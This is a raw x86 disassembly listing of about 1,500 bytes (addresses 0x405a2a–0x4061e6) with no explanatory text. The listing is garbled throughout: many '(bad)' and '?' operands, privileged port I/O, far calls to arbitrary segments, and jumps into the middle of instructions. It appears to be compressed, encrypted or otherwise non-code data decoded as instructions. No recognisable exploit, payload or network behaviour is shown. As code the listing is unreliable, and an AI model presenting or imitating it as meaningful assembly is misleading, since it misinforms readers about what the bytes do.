  405a2a:	cli    
  405a2b:	rcr    ecx,cl
  405a2d:	mov    cl,0x52
  405a2f:	hlt    
  405a30:	out    0x1b,eax
  405a32:	jnp    0x4059d2
  405a34:	call   0x149b:0x8c0d354d
  405a3b:	(bad)  
  405a3d:	add    al,0x71
  405a3f:	xor    eax,0xfad6fc4d
  405a44:	aaa    
  405a45:	or     eax,0x232621f7
  405a4a:	call   0xd8f8:0xc0b1926
  405a51:	and    al,0x70
  405a53:	add    cl,al
  405a55:	xchg   ecx,eax
  405a56:	mov    bh,0xdf
  405a58:	cli    
  405a59:	out    0x98,eax
  405a5b:	imul   BYTE PTR [ecx-0x4]
  405a5e:	push   esi
  405a5f:	punpcklbw mm2,DWORD PTR [esp+edx*4]
  405a63:	mov    al,0x96
  405a65:	in     eax,0x32
  405a67:	cmc    
  405a68:	jg     0x4059fd
  405a6a:	les    esi,FWORD PTR [ecx+0x35fcbda8]
  405a70:	inc    edx
  405a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a72:	fcom   QWORD PTR ds:0x1b702ae2
  405a78:	(bad)  
  405a79:	sub    ebx,DWORD PTR [edi-0x24]
  405a7c:	in     eax,dx
  405a7d:	test   BYTE PTR ds:0xdd124c5f,ah
  405a83:	and    cl,ch
  405a85:	clc    
  405a86:	not    ebx
  405a88:	adc    bh,0x9a
  405a8b:	xor    eax,0x1b4d0d0e
  405a90:	add    bh,BYTE PTR [ecx]
  405a92:	out    0xf5,al
  405a94:	jle    0x405a17
  405a96:	dec    esp
  405a97:	mov    BYTE PTR [esp+ecx*1+0x9582656],0xcf
  405a9f:	and    ah,BYTE PTR [edx+0x35c81f25]
  405aa5:	ret    0xf901
  405aa8:	scas   eax,DWORD PTR es:[edi]
  405aa9:	outs   dx,DWORD PTR ds:[esi]
  405aaa:	xchg   DWORD PTR [ebp+0x28ab15f4],ecx
  405ab0:	sub    eax,0xcef3afce
  405ab5:	out    0x9b,eax
  405ab7:	mov    ch,0xe9
  405ab9:	cld    
  405aba:	dec    ecx
  405abb:	imul   ebp,DWORD PTR [edx],0xffffff91
  405abe:	dec    edi
  405abf:	mov    ds:0x8cdcaa42,al
  405ac4:	inc    esp
  405ac5:	loop   0x405a65
  405ac7:	mov    esi,0x603087b6
  405acc:	ss das 
  405ace:	inc    ebx
  405acf:	into   
  405ad0:	lds    ecx,FWORD PTR [edx+eiz*4+0x37]
  405ad4:	push   ecx
  405ad5:	jnp    0x405b23
  405ad7:	shl    DWORD PTR [esi+0x5],cl
  405ada:	dec    edx
  405adb:	dec    ebx
  405adc:	into   
  405add:	xor    al,BYTE PTR [ebx-0x27f8727d]
  405ae3:	pop    ds
  405ae4:	shl    DWORD PTR [edi-0x497220d7],1
  405aea:	mov    ds:0xa6ebea0f,al
  405aef:	(bad)  
  405af0:	or     DWORD PTR [edx],ebp
  405af2:	jle    0x405a9e
  405af4:	call   0x44ff4b90
  405af9:	xchg   eax,edx
  405afb:	mov    al,ds:0x51e5f2ba
  405b00:	mov    al,0xe8
  405b02:	dec    edi
  405b03:	(bad)  
  405b04:	test   BYTE PTR [esi+0x6d81e7fe],0x6b
  405b0b:	stos   DWORD PTR es:[edi],eax
  405b0c:	inc    edi
  405b0d:	xchg   ebp,eax
  405b0e:	sub    al,0xbf
  405b10:	fsub   DWORD PTR [edi]
  405b12:	dec    ebx
  405b13:	arpl   WORD PTR [ebx-0x2b6eb6f7],ax
  405b19:	outs   dx,DWORD PTR ds:[esi]
  405b1a:	lods   al,BYTE PTR ds:[esi]
  405b1b:	xor    cl,BYTE PTR [ebp-0x4d]
  405b1e:	int    0xd2
  405b20:	into   
  405b21:	stos   DWORD PTR es:[edi],eax
  405b22:	adc    dh,BYTE PTR [ecx]
  405b24:	mov    ch,0xe0
  405b26:	mov    eax,0x38f04ac9
  405b2b:	aas    
  405b2c:	in     al,dx
  405b2d:	cs shl dl,cl
  405b30:	loop   0x405b78
  405b32:	inc    ecx
  405b33:	cwde   
  405b34:	rol    ah,cl
  405b36:	sbb    DWORD PTR ds:0x5c908a49,ebp
  405b3c:	mov    dl,0x5b
  405b3e:	mov    ds:0xb15e364c,al
  405b43:	addr16 jp 0x405ae1
  405b46:	out    dx,eax
  405b47:	jns    0x405b38
  405b49:	xchg   ebx,eax
  405b4a:	out    0xbe,eax
  405b4c:	or     eax,0xe04c38f6
  405b51:	and    eax,DWORD PTR [edi+edx*4-0x67]
  405b55:	ret    0x170c
  405b58:	dec    esi
  405b59:	mov    ch,0xe5
  405b5b:	sub    edi,DWORD PTR [esi]
  405b5d:	dec    esi
  405b5e:	mov    ebx,0xdfdca4dc
  405b63:	add    DWORD PTR [eax-0xd],esi
  405b66:	push   esi
  405b67:	das    
  405b68:	sub    DWORD PTR [ebp-0x3646d448],ebx
  405b6e:	mov    eax,0x25164e18
  405b73:	or     BYTE PTR [esi+0x36],0x7e
  405b77:	fadd   QWORD PTR [ecx-0xf52b903]
  405b7d:	push   ebx
  405b7e:	jge    0x405b02
  405b80:	sub    al,0x7f
  405b82:	mov    dl,0x24
  405b84:	shr    esp,cl
  405b86:	pop    esi
  405b87:	fbstp  TBYTE PTR [ebp-0x73]
  405b8a:	jl     0x405bdd
  405b8c:	pusha  
  405b8d:	clc    
  405b8e:	or     eax,DWORD PTR [edi-0x1d]
  405b91:	xor    esi,ebx
  405b93:	pop    ss
  405b94:	out    0xc1,eax
  405b96:	sub    BYTE PTR [eax-0x588242ec],ah
  405b9c:	sub    BYTE PTR [ecx+0x1f2b8067],0x37
  405ba3:	jmp    0x405b9e
  405ba5:	and    DWORD PTR [ebx],esi
  405ba7:	mov    esp,0xb657db09
  405bac:	fidivr WORD PTR [edx-0x645ed060]
  405bb2:	in     eax,dx
  405bb3:	xchg   ebp,eax
  405bb4:	or     esi,DWORD PTR [esi+0x4b]
  405bb7:	sbb    al,0x69
  405bb9:	rcr    DWORD PTR [edi],1
  405bbb:	jg     0x405b42
  405bbd:	enter  0x14f9,0x95
  405bc1:	push   0x64
  405bc3:	xchg   ecx,eax
  405bc4:	jne    0x405be0
  405bc6:	pop    esp
  405bc7:	inc    edx
  405bc8:	adc    eax,0xfad9b690
  405bcd:	pushf  
  405bce:	push   ebp
  405bcf:	je     0x405bdd
  405bd1:	mov    ch,0x83
  405bd3:	xor    eax,0xf69024e4
  405bd8:	aad    0x8e
  405bda:	outs   dx,DWORD PTR ds:[esi]
  405bdb:	push   esi
  405bdc:	xor    dl,BYTE PTR [ecx-0x26f3bf32]
  405be2:	fdivr  DWORD PTR [ebp-0x26bdf12]
  405be8:	mov    dl,dh
  405bea:	push   ds
  405beb:	mov    es,WORD PTR [ebx-0xa]
  405bee:	pop    esp
  405bef:	scas   al,BYTE PTR es:[edi]
  405bf0:	iret   
  405bf1:	out    dx,al
  405bf2:	xchg   BYTE PTR [esi],dh
  405bf4:	mov    edx,0xa6645add
  405bf9:	lahf   
  405bfa:	dec    ebp
  405bfb:	push   edx
  405bfc:	or     eax,0xc7d7d818
  405c01:	das    
  405c02:	cld    
  405c03:	loope  0x405b9c
  405c05:	arpl   WORD PTR [esi],sp
  405c07:	cdq    
  405c08:	inc    eax
  405c09:	push   ecx
  405c0a:	cmp    DWORD PTR [esi+0x4f],eax
  405c0d:	mov    esp,0x437e3b82
  405c12:	cli    
  405c13:	push   esi
  405c14:	mov    bl,0x3e
  405c16:	sub    esp,DWORD PTR [esi+0x4b]
  405c19:	out    0xb8,eax
  405c1b:	sbb    BYTE PTR [edx-0x1f],dh
  405c1e:	test   BYTE PTR [ecx],bh
  405c20:	mov    dh,0x4
  405c22:	rcl    DWORD PTR [edx-0x70],cl
  405c25:	dec    esp
  405c26:	fldcw  WORD PTR [ebp-0x5d]
  405c29:	add    esp,edi
  405c2b:	or     al,al
  405c2d:	xor    eax,0xab2a4da3
  405c32:	scas   eax,DWORD PTR es:[edi]
  405c33:	loop   0x405bcf
  405c35:	add    al,0xd1
  405c37:	and    al,0xf
  405c39:	pop    ebx
  405c3a:	rcr    BYTE PTR [ebx],0x91
  405c3d:	add    al,BYTE PTR [ebx+ecx*8+0x5d]
  405c41:	push   ebx
  405c42:	aaa    
  405c43:	mov    edi,0x32ef2761
  405c48:	pop    edi
  405c49:	mov    ebp,0x1eca2622
  405c4e:	daa    
  405c4f:	mov    eax,ds:0x4a30d08f
  405c54:	data16 fild DWORD PTR [edi-0x60]
  405c58:	pop    esi
  405c59:	dec    eax
  405c5a:	dec    esp
  405c5b:	jnp    0x405cc1
  405c5d:	xchg   ebp,eax
  405c5e:	fs xchg esp,eax
  405c60:	jmp    DWORD PTR [ebp-0x3471c5c1]
  405c66:	or     DWORD PTR [eax],ebx
  405c68:	jo     0x405ce5
  405c6a:	sub    eax,ecx
  405c6c:	xor    al,0x97
  405c6e:	in     al,dx
  405c6f:	mov    ebp,0x4211d5a2
  405c74:	mov    ah,BYTE PTR [esi+ecx*1+0x189267a3]
  405c7b:	ss or  dh,cl
  405c7e:	mov    dl,0x91
  405c80:	std    
  405c81:	fcomp  QWORD PTR [esi+0x7]
  405c84:	repnz outs dx,DWORD PTR ds:[esi]
  405c86:	int3   
  405c87:	xlat   BYTE PTR ds:[ebx]
  405c88:	xchg   edx,edx
  405c8a:	sub    al,0x64
  405c8c:	stc    
  405c8d:	dec    eax
  405c8e:	xchg   DWORD PTR [ecx+edi*2],ebp
  405c91:	add    DWORD PTR ds:0x268f6c4a,edi
  405c97:	pop    edi
  405c98:	jp     0x405c4c
  405c9a:	cmp    eax,0xd7bfff6f
  405c9f:	pop    edx
  405ca0:	cmp    DWORD PTR [ecx+0x3aff2ba9],eax
  405ca6:	push   cs
  405ca7:	add    eax,esi
  405ca9:	shl    BYTE PTR [esi+0x53337184],0xe9
  405cb0:	dec    esi
  405cb1:	cmc    
  405cb2:	mov    ah,0x3c
  405cb4:	jp     0x405cc2
  405cb6:	fstp   QWORD PTR [eax]
  405cb8:	in     al,0xbc
  405cba:	jge    0x405ce0
  405cbc:	jmp    0x405ca6
  405cbe:	test   al,0xf1
  405cc0:	sub    eax,0x7300e220
  405cc5:	dec    eax
  405cc6:	test   DWORD PTR [edi-0x35e1c8a3],0xf03213d
  405cd0:	jl     0x405cc2
  405cd2:	mov    ch,0xd7
  405cd4:	mov    cl,0x3
  405cd6:	jmp    0xd28c62b1
  405cdb:	cdq    
  405cdc:	hlt    
  405cdd:	pusha  
  405cde:	mov    ds:0x40fafda7,al
  405ce3:	mov    ebp,0xfd3b3999
  405ce8:	adc    al,0x60
  405cea:	inc    edx
  405ceb:	mov    ecx,0xf0a150ef
  405cf0:	inc    edx
  405cf1:	xchg   ebp,eax
  405cf2:	jmp    0x405cf9
  405cf4:	fidiv  WORD PTR [ebx-0x696a58cb]
  405cfa:	sbb    eax,0x9e8b5e69
  405cff:	xlat   BYTE PTR ds:[ebx]
  405d00:	sti    
  405d01:	or     eax,0x4dce1299
  405d06:	je     0x405d73
  405d08:	lahf   
  405d09:	ss (bad) 
  405d0c:	shl    ch,cl
  405d0e:	jno    0x405d89
  405d10:	scas   al,BYTE PTR es:[edi]
  405d11:	mov    ch,0xf
  405d13:	xor    eax,0x27645355
  405d18:	out    dx,al
  405d19:	jge    0x405d61
  405d1b:	pusha  
  405d1c:	fldenv [eax+0x33d0c53f]
  405d22:	or     ebx,ebp
  405d24:	mov    al,0x5d
  405d26:	cmp    edx,edi
  405d28:	out    dx,eax
  405d29:	lods   eax,DWORD PTR ds:[esi]
  405d2a:	frstor [ebp+0xd763e91]
  405d30:	stc    
  405d31:	ror    BYTE PTR [ebx-0x6f],cl
  405d34:	pop    edi
  405d35:	cwde   
  405d36:	loopne 0x405d7d
  405d38:	dec    BYTE PTR ds:0x7d6c3a8d
  405d3e:	jecxz  0x405d41
  405d40:	xchg   edx,edi
  405d42:	pop    edx
  405d43:	push   ss
  405d44:	push   ecx
  405d45:	aaa    
  405d46:	daa    
  405d47:	sub    bl,dh
  405d49:	test   esp,0x615da565
  405d4f:	mov    bl,BYTE PTR [esi-0x833009a]
  405d55:	mov    ch,0xf2
  405d57:	cli    
  405d58:	or     eax,0x240da86f
  405d5d:	or     BYTE PTR ds:0xb2b2399e,al
  405d63:	xlat   BYTE PTR ds:[ebx]
  405d64:	or     eax,0x60811014
  405d69:	pop    eax
  405d6a:	or     eax,0xd50f1763
  405d6f:	cli    
  405d70:	outs   dx,DWORD PTR ds:[esi]
  405d71:	mov    al,0xd7
  405d73:	mov    ds:0x94d5b543,eax
  405d78:	sbb    BYTE PTR [edx-0x1d],0x71
  405d7c:	mov    ebx,0x467d12f0
  405d81:	mov    WORD PTR [eax+0x5],ss
  405d84:	das    
  405d85:	add    BYTE PTR [edi+0x67],ch
  405d88:	imul   ecx,DWORD PTR [edi+0x46be00b3],0xa4a8dbc1
  405d92:	and    DWORD PTR [eax],eax
  405d94:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  405d96:	stos   DWORD PTR es:[edi],eax
  405d97:	cmp    ch,BYTE PTR [ebp+0x44407146]
  405d9d:	sbb    eax,0xeb2ec4c0
  405da2:	pop    ecx
  405da3:	in     eax,dx
  405da4:	push   es
  405da5:	pusha  
  405da6:	shr    BYTE PTR [edi],cl
  405da8:	xchg   esp,eax
  405da9:	dec    BYTE PTR ds:[ecx+0x35]
  405dad:	in     eax,0x42
  405daf:	(bad)  
  405db0:	mov    ?,WORD PTR [eax]
  405db2:	xchg   esi,eax
  405db3:	daa    
  405db4:	xchg   ebp,eax
  405db5:	or     al,0xd4
  405db7:	inc    ebx
  405db8:	mov    eax,ds:0xafcd174
  405dbd:	leave  
  405dbe:	ficom  DWORD PTR ds:0x861bad66
  405dc4:	mov    eax,0x4ef196d0
  405dc9:	scas   al,BYTE PTR es:[edi]
  405dca:	xor    eax,0xd299c171
  405dcf:	int    0xdd
  405dd1:	(bad)  
  405dd2:	fadd   QWORD PTR [ecx]
  405dd4:	xor    ebp,eax
  405dd6:	mov    DWORD PTR [edx+0x7],ebx
  405dd9:	test   BYTE PTR [edx-0x5e],ch
  405ddc:	adc    DWORD PTR [ecx+0x36f1c736],ecx
  405de2:	test   BYTE PTR [edi+0x0],bh
  405de5:	clc    
  405de6:	das    
  405de7:	ins    DWORD PTR es:[edi],dx
  405de8:	add    DWORD PTR ds:0xd2e9265d,esi
  405dee:	xchg   DWORD PTR [edi-0x60],edi
  405df1:	mov    ah,0x9
  405df3:	(bad)  
  405df4:	cld    
  405df5:	clc    
  405df6:	rcr    BYTE PTR [edi],1
  405df8:	adc    al,0xc1
  405dfa:	mov    ds,edi
  405dfc:	sbb    dh,al
  405dfe:	aas    
  405dff:	scas   al,BYTE PTR es:[edi]
  405e00:	push   0xfffffffb
  405e02:	outs   dx,BYTE PTR ds:[esi]
  405e03:	outs   dx,BYTE PTR ds:[esi]
  405e04:	cwde   
  405e05:	inc    ecx
  405e06:	mov    esi,DWORD PTR [eax+0x12]
  405e09:	fsub   DWORD PTR [edx-0x5a3346cb]
  405e0f:	mov    dl,0x27
  405e11:	lods   eax,DWORD PTR ds:[esi]
  405e12:	in     al,dx
  405e13:	fst    DWORD PTR [ebp-0x39a10fc6]
  405e19:	(bad)  
  405e1a:	and    DWORD PTR [esi-0x6],eax
  405e1d:	loope  0x405dc8
  405e1f:	mov    WORD PTR [esi+0x37],?
  405e22:	js     0x405e66
  405e24:	xchg   esp,eax
  405e25:	inc    eax
  405e26:	inc    esi
  405e27:	int    0x5b
  405e29:	stc    
  405e2a:	mov    bl,0x29
  405e2c:	pop    ebx
  405e2d:	out    dx,al
  405e2e:	or     BYTE PTR [edi],dh
  405e30:	test   eax,0x9bacd165
  405e35:	repz mov esp,DWORD PTR [ecx-0x1403a756]
  405e3c:	lock int3 
  405e3e:	mov    dh,0xc1
  405e40:	jnp    0x405dd3
  405e42:	dec    ecx
  405e43:	push   es
  405e44:	adc    ecx,esi
  405e46:	and    DWORD PTR [edi+0x26e698aa],ebx
  405e4c:	cmp    DWORD PTR [eax-0x5c5be7b9],edi
  405e52:	push   0xa911b79a
  405e57:	jecxz  0x405e48
  405e59:	shl    DWORD PTR [eax],1
  405e5b:	out    0x12,eax
  405e5d:	jb     0x405e3b
  405e5f:	aas    
  405e60:	icebp  
  405e61:	fisttp QWORD PTR [edx]
  405e63:	loope  0x405e10
  405e65:	(bad)  
  405e66:	je     0x405e90
  405e68:	and    ah,BYTE PTR ds:0xe872ff0e
  405e6e:	cmp    al,0x76
  405e70:	jbe    0x405e52
  405e72:	push   ds
  405e73:	daa    
  405e74:	push   ss
  405e75:	bound  esi,QWORD PTR [ebx+0x7b]
  405e78:	repz cli 
  405e7a:	fld    TBYTE PTR [edx]
  405e7c:	mov    ebp,0x4b00662e
  405e81:	pushf  
  405e82:	fs stc 
  405e84:	sub    al,0xb6
  405e86:	mov    edx,0xca20e4ff
  405e8b:	pop    edx
  405e8c:	xchg   esp,eax
  405e8d:	aam    0x26
  405e8f:	out    dx,al
  405e90:	sahf   
  405e91:	dec    ebx
  405e92:	sub    eax,0xd33ff9d1
  405e97:	fldenv [ebx]
  405e99:	hlt    
  405e9a:	loop   0x405e9d
  405e9c:	sti    
  405e9d:	push   esi
  405e9e:	mov    esi,0xfe300415
  405ea3:	adc    DWORD PTR [ebx],eax
  405ea5:	cmp    ch,BYTE PTR [ebp+edx*4+0x14]
  405ea9:	dec    esp
  405eaa:	sbb    dh,BYTE PTR es:[edx+0x3e]
  405eae:	xchg   ebx,eax
  405eaf:	popw   es
  405eb1:	cmp    BYTE PTR [edi-0xf],bh
  405eb4:	fs jle 0x405e62
  405eb7:	jb     0x405edf
  405eb9:	(bad)  
  405eba:	xchg   ebp,eax
  405ebb:	mov    esi,0x497f6f0e
  405ec0:	call   0x5cd5:0xa6c8fe2a
  405ec7:	pop    ebp
  405ec9:	je     0x405f1b
  405ecb:	lods   eax,DWORD PTR ds:[esi]
  405ecc:	arpl   WORD PTR [eax+edx*4+0x4685c98f],ax
  405ed3:	mov    es,WORD PTR [eax+0xfe676d1]
  405ed9:	popf   
  405eda:	ds jo  0x405f07
  405edd:	adc    ah,BYTE PTR [esi]
  405edf:	add    al,0x25
  405ee1:	mov    dl,BYTE PTR [eax-0xe]
  405ee4:	rcr    BYTE PTR [eax],0xff
  405ee7:	in     al,0x6e
  405ee9:	mov    al,gs:0x59273bc8
  405eef:	clc    
  405ef0:	ja     0x405ec1
  405ef2:	and    edx,DWORD PTR [edi+0x4c]
  405ef5:	ret    
  405ef6:	jge    0x405f1c
  405ef8:	push   cs
  405ef9:	(bad)  
  405efa:	and    esp,DWORD PTR [eax-0x51aea7c0]
  405f00:	lods   al,BYTE PTR ds:[esi]
  405f01:	or     DWORD PTR [ebx],ebx
  405f03:	xchg   BYTE PTR [edi+eiz*1+0x6a94063e],dh
  405f0a:	mov    bh,0x2f
  405f0c:	jae    0x405f37
  405f0e:	cmp    eax,0x6761f79d
  405f13:	das    
  405f14:	lea    esi,[edx-0x3f07f4b7]
  405f1a:	mov    ds:0x70f2075a,al
  405f1f:	ins    DWORD PTR es:[edi],dx
  405f20:	xchg   edx,eax
  405f21:	add    BYTE PTR [ecx-0x14dc0492],al
  405f27:	jecxz  0x405eb8
  405f29:	mov    ds:0x3162c3b0,al
  405f2e:	push   ebx
  405f2f:	push   ecx
  405f30:	jecxz  0x405f4f
  405f32:	dec    eax
  405f33:	in     eax,dx
  405f34:	inc    edx
  405f35:	call   0x7b52:0xee761430
  405f3c:	mov    edx,edi
  405f3e:	lock cmp DWORD PTR gs:[ecx+esi*8],esi
  405f43:	inc    esi
  405f44:	push   0x2c18df3f
  405f49:	dec    edi
  405f4a:	clc    
  405f4b:	cld    
  405f4c:	inc    esi
  405f4d:	fs (bad) 
  405f4f:	cli    
  405f50:	push   cs
  405f51:	shl    cl,0x8b
  405f54:	imul   eax,DWORD PTR [esi+edx*4],0xffffffd5
  405f58:	mov    ds:0x54144783,eax
  405f5d:	inc    edi
  405f5e:	and    eax,0x9b13d3b0
  405f63:	inc    edx
  405f64:	xchg   esi,eax
  405f65:	(bad)  
  405f66:	dec    edi
  405f67:	xor    esi,edx
  405f69:	or     BYTE PTR ds:0xa52822ba,cl
  405f6f:	jmp    0x405f63
  405f71:	imul   edx,ebp,0x5d
  405f74:	fs fsub st,st(1)
  405f78:	ss or  al,0x65
  405f7b:	mov    bh,0xe8
  405f7d:	push   edi
  405f7e:	add    bl,BYTE PTR [ebx-0x528b0d1c]
  405f84:	iret   
  405f85:	sbb    BYTE PTR [edx+0x21a7556c],dh
  405f8b:	addr16 push ebp
  405f8d:	ret    0x33b3
  405f90:	jo     0x405f5b
  405f92:	inc    ebp
  405f93:	xchg   DWORD PTR [edi],esp
  405f95:	ss (bad) 
  405f97:	fisubr DWORD PTR [ebx]
  405f99:	push   eax
  405f9a:	push   ss
  405f9b:	dec    edx
  405f9c:	neg    esp
  405f9e:	xchg   edx,eax
  405f9f:	je     0x405f89
  405fa1:	stos   BYTE PTR es:[edi],al
  405fa2:	bound  edi,QWORD PTR [eax-0x25]
  405fa5:	aas    
  405fa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fa7:	and    DWORD PTR [edi+esi*8+0x18],esi
  405fab:	loop   0x405f81
  405fad:	cmp    al,0x55
  405faf:	out    0x77,eax
  405fb1:	sbb    DWORD PTR [ebp+0x4ad1b61],0x59
  405fb8:	or     ah,BYTE PTR [esi]
  405fba:	pop    es
  405fbb:	xor    al,0x2
  405fbd:	xchg   edx,eax
  405fbe:	enter  0xe6bd,0xe1
  405fc2:	lea    edx,[ebx+0x38]
  405fc5:	inc    edx
  405fc6:	jl     0x405f53
  405fc8:	jl     0x405f95
  405fca:	iret   
  405fcb:	repnz xor BYTE PTR [ebp+0x286ad46c],dh
  405fd2:	sub    eax,0x6a08b935
  405fd7:	fadd   QWORD PTR [ebx+edx*2+0x5]
  405fdb:	mov    eax,ds:0x312c9324
  405fe0:	pop    edx
  405fe1:	inc    edi
  405fe2:	clc    
  405fe3:	pop    edx
  405fe4:	fwait
  405fe5:	sbb    DWORD PTR [ebx+0x1e],ecx
  405fe8:	adc    al,0xfb
  405fea:	ffreep st(6)
  405fec:	out    dx,eax
  405fed:	mov    WORD PTR [edx+ebp*4-0x5e95b8ae],es
  405ff4:	lahf   
  405ff5:	pop    ecx
  405ff6:	jle    0x405fb4
  405ff8:	inc    ecx
  405ff9:	ja     0x406034
  405ffb:	jg     0x406041
  405ffd:	adc    eax,0x75656a51
  406002:	popf   
  406003:	fstp   QWORD PTR [ebp+0x2c85728f]
  406009:	pop    ecx
  40600a:	inc    eax
  40600b:	or     cl,BYTE PTR [esi+0x52]
  40600e:	pop    ss
  40600f:	out    0xcc,al
  406011:	adc    al,0x44
  406013:	jno    0x405fca
  406015:	push   edx
  406016:	dec    ebp
  406017:	data16 je 0x405fd0
  40601a:	sbb    esp,DWORD PTR [eax+edi*4]
  40601d:	or     ebp,DWORD PTR [edi+0x15]
  406020:	pop    edi
  406021:	mov    bh,BYTE PTR [esp+edx*8-0x5f]
  406025:	mov    al,0x8e
  406027:	imul   edi,DWORD PTR [eax],0xeb1ebfd4
  40602d:	and    al,0x79
  40602f:	ins    DWORD PTR es:[edi],dx
  406030:	loop   0x405fb2
  406032:	mov    WORD PTR [edx+0x4d36a77c],?
  406038:	daa    
  406039:	xor    ch,BYTE PTR [esi-0x7c90fcca]
  40603f:	div    DWORD PTR [ecx+edx*1-0x4a]
  406043:	mov    ah,0x59
  406045:	pop    edx
  406046:	mov    DWORD PTR [ecx-0x6be18b1c],0x1362f2ba
  406050:	pop    ds
  406051:	dec    esp
  406052:	add    DWORD PTR [edi],eax
  406054:	ficomp DWORD PTR [ebp+0xd]
  406057:	lock lahf 
  406059:	mov    WORD PTR [ecx-0x5d],fs
  40605c:	(bad)
  40605f:	nop
  406060:	mov    ds:0x8e2e8c1b,al
  406065:	fstp   TBYTE PTR [eax]
  406067:	outs   dx,DWORD PTR ds:[esi]
  406068:	retf   0x744f
  40606b:	xor    dl,BYTE PTR [ecx+ebx*4]
  40606e:	int    0xaa
  406070:	and    eax,0x1a607b76
  406075:	jmp    0x12a7:0xa06b0b61
  40607c:	cld    
  40607d:	add    ebx,0x52
  406080:	push   esp
  406081:	fnstsw WORD PTR [edx+0x5b]
  406084:	test   eax,0xd0734c6f
  406089:	mul    BYTE PTR [edx]
  40608b:	pop    esi
  40608c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40608d:	jge    0x4060ab
  40608f:	in     al,0xbd
  406091:	mov    esp,0x1709ac77
  406096:	gs xchg ecx,eax
  406098:	sbb    al,0xef
  40609a:	xchg   edi,eax
  40609b:	cdq    
  40609c:	jmp    0x406072
  40609e:	dec    edi
  40609f:	lahf   
  4060a0:	mov    eax,ds:0x5dd03fee
  4060a5:	inc    eax
  4060a6:	aas    
  4060a7:	cdq    
  4060a8:	push   ecx
  4060a9:	cmc    
  4060aa:	dec    ebx
  4060ab:	sub    bh,BYTE PTR [esi-0x6affe3d7]
  4060b1:	add    eax,0x9b8193b1
  4060b6:	out    dx,al
  4060b7:	aad    0xac
  4060b9:	mov    ch,0x9a
  4060bb:	into   
  4060bc:	xchg   esi,eax
  4060bd:	xchg   ebx,eax
  4060be:	and    BYTE PTR [ecx],bh
  4060c0:	xchg   edx,eax
  4060c1:	js     0x406075
  4060c3:	fwait
  4060c4:	mov    ch,0xdb
  4060c6:	jns    0x40604d
  4060c8:	fmul   st,st(0)
  4060ca:	and    DWORD PTR [eax],0x1
  4060cd:	outs   dx,DWORD PTR ds:[esi]
  4060ce:	in     al,dx
  4060cf:	mov    dh,0x3
  4060d1:	addr16 dec edx
  4060d3:	popf   
  4060d4:	sbb    eax,0x96417fec
  4060d9:	popf   
  4060da:	loopne 0x406116
  4060dc:	int    0x2f
  4060de:	xchg   ecx,eax
  4060df:	mov    ebx,0x70a53cdc
  4060e4:	shl    DWORD PTR [esi-0x9],0x7e
  4060e8:	out    0xf1,al
  4060ea:	dec    eax
  4060eb:	xchg   ebp,eax
  4060ec:	mov    eax,ds:0x2dd230d9
  4060f1:	jp     0x406127
  4060f3:	dec    esi
  4060f4:	cmp    al,BYTE PTR [edi-0x5f]
  4060f7:	adc    al,0xb
  4060f9:	loop   0x4060af
  4060fb:	imul   edi,DWORD PTR [ecx+esi*2+0x5ca56cac],0x58
  406103:	dec    ecx
  406104:	inc    ebx
  406105:	icebp  
  406106:	dec    ecx
  406107:	fistp  DWORD PTR [ebp+edi*4-0xe]
  40610b:	mov    eax,eax
  40610d:	jmp    0x22bc2bd2
  406112:	push   ebp
  406113:	push   ebp
  406114:	pop    edx
  406115:	and    ecx,esp
  406117:	lea    ecx,[ebp+eiz*4+0x5c86fd3e]
  40611e:	(bad)  
  406120:	addr16 pop es
  406122:	mov    ah,0x3d
  406124:	addr16 jmp 0x2f7a5631
  40612a:	imul   ecx,ebp,0x57
  40612d:	mov    dh,0x1b
  40612f:	sub    ch,cl
  406131:	repnz cmc 
  406133:	mov    esi,0x78da34ab
  406138:	loope  0x406180
  40613a:	jmp    0xe090:0x63720e9f
  406141:	js     0x40615c
  406143:	lahf   
  406144:	fs jmp 0x4061a1
  406147:	pop    edi
  406148:	pop    esi
  406149:	push   eax
  40614a:	jp     0x406130
  40614c:	scas   eax,DWORD PTR es:[edi]
  40614d:	sub    al,0xb7
  40614f:	mov    cs,WORD PTR [edx]
  406151:	dec    ecx
  406152:	pop    eax
  406153:	add    al,0x1c
  406155:	jmp    0x4061a7
  406157:	out    0xe0,al
  406159:	cmp    BYTE PTR [eax-0x28],bh
  40615c:	imul   BYTE PTR [edx-0x4e]
  40615f:	or     edi,DWORD PTR [esi-0x60]
  406162:	add    eax,0x4ecd5c97
  406167:	and    BYTE PTR [ebp+0x56],0xcd
  40616b:	rcl    DWORD PTR [ecx],0x86
  40616e:	pop    eax
  40616f:	xor    DWORD PTR [eax],0xa8914d44
  406175:	mov    dh,0xb2
  406177:	cs pop esp
  406179:	xchg   ebp,eax
  40617a:	jno    0x406167
  40617c:	sar    edi,0xad
  40617f:	pusha  
  406180:	rol    edi,0xf2
  406183:	or     dl,BYTE PTR [eax+ecx*1+0x19]
  406187:	in     eax,dx
  406188:	push   ebp
  406189:	jge    0x4061c5
  40618b:	adc    DWORD PTR [edi-0x79],ebp
  40618e:	push   ds
  40618f:	mov    WORD PTR [edx+eiz*4-0x1482b557],es
  406196:	loop   0x40615b
  406198:	jmp    0x406151
  40619a:	rcr    BYTE PTR [esp+edx*1-0x53],cl
  40619e:	jb     0x406215
  4061a0:	push   ecx
  4061a1:	les    eax,FWORD PTR [edx+0x31]
  4061a4:	sub    eax,DWORD PTR [eax]
  4061a6:	or     BYTE PTR ds:0x61b8aeef,0xd1
  4061ad:	cdq    
  4061ae:	sti    
  4061af:	movhps QWORD PTR [eax-0x79f4eda7],xmm2
  4061b6:	sar    DWORD PTR [eax],1
  4061b8:	jge    0x406153
  4061ba:	and    eax,0xe975d9e0
  4061bf:	rcr    edi,0x61
  4061c2:	aaa    
  4061c3:	scas   al,BYTE PTR es:[edi]
  4061c4:	xchg   DWORD PTR [edx+0x46],eax
  4061c7:	and    DWORD PTR [edi+edi*1-0x3e470a5c],edx
  4061ce:	and    DWORD PTR [esi-0x21],ebp
  4061d1:	pop    es
  4061d2:	push   cs
  4061d3:	adc    al,0x72
  4061d5:	cmc    
  4061d6:	ins    DWORD PTR es:[edi],dx
  4061d7:	dec    eax
  4061d8:	addr16 pop ss
  4061da:	js     0x4061e8
  4061dc:	push   ss
  4061dd:	dec    esp
  4061de:	sub    al,0x3d
  4061e0:	aaa    
  4061e1:	adc    al,0xb3
  4061e3:	cld    
  4061e4:	adc    dl,dh
  4061e6:	loopne 0x406168
